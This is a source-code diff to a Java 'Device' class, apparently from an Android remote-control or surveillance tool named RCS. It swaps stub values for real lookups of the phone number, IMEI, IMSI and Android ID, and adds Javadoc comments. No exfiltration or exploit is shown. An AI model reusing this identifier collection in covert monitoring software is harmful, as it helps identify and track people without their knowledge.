@@ -6,18 +6,34 @@
  **********************************************/
 package com.ht.RCSAndroidGUI;
 
+import android.accounts.AccountManager;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
+
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
-import com.ht.RCSAndroidGUI.utils.WChar;
 
-import android.content.ContentResolver;
-import android.provider.Settings;
-
+// TODO: Auto-generated Javadoc
+/**
+ * The Class Device.
+ */
 public class Device {
+	
+	/** The content resolver. */
 	private ContentResolver contentResolver;
+	
+	/** The android id. */
 	private String androidId;
 
-	public void init(ContentResolver cr) throws RCSException {
+	/**
+	 * Inits the.
+	 *
+	 * @param cr the cr
+	 * @throws RCSException the rCS exception
+	 */
+	public void init(final ContentResolver cr) throws RCSException {
 		if (cr == null) {
 			throw new RCSException("ContentResolver Invalid");
 		}
@@ -25,8 +41,14 @@ public class Device {
 		this.contentResolver = cr;
 	}
 
+	/** The singleton. */
 	private volatile static Device singleton;
 
+	/**
+	 * Self.
+	 *
+	 * @return the device
+	 */
 	public static Device self() {
 		if (singleton == null) {
 			synchronized (Device.class) {
@@ -41,30 +63,65 @@ public class Device {
 		return singleton;
 	}
 
+	/**
+	 * Gets the user id.
+	 *
+	 * @return the user id
+	 */
 	public String getUserId() {
-
+		AccountManager ac=AccountManager.get(RCSAndroidGUI.getAppContext());
 		return "MyUSERId";
 	}
 
+	/**
+	 * Gets the device id.
+	 *
+	 * @return the device id
+	 */
 	public String getDeviceId() {
-		String id= Settings.System.getString(contentResolver,
-                Settings.System.ANDROID_ID) ;
+		final String id = Settings.System.getString(contentResolver,
+				Settings.System.ANDROID_ID);
 		return id;
 	}
 
+	/**
+	 * Gets the phone number.
+	 *
+	 * @return the phone number
+	 */
 	public String getPhoneNumber() {
-		// TODO 
-		return "+123456";
+	    TelephonyManager mTelephonyMgr;
+	    mTelephonyMgr = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE); 
+	    return mTelephonyMgr.getLine1Number();
 	}
 
+	/**
+	 * Gets the version.
+	 *
+	 * @return the version
+	 */
 	public byte[] getVersion() {
-		 final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
-	        //#ifdef DBC
-	        Check.ensures(versionRet.length == 4, "Wrong version len");
-	        //#endif
-	        return versionRet;
+		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
+		// #ifdef DBC
+		Check.ensures(versionRet.length == 4, "Wrong version len");
+		// #endif
+		return versionRet;
 	}
 
+	public static boolean isCDMA() {
+		// TODO Auto-generated method stub
+		return false;
+	}
+
+	public String getImei() {
+		TelephonyManager telephonyManager = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		return telephonyManager.getDeviceId();
+	}
+
+	public String getImsi() {
+		TelephonyManager telephonyManager = (TelephonyManager)RCSAndroidGUI.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		return telephonyManager.getSubscriberId();
+	}
 
 	/*
 	 * public void init() throws RCSException { this.androidId =
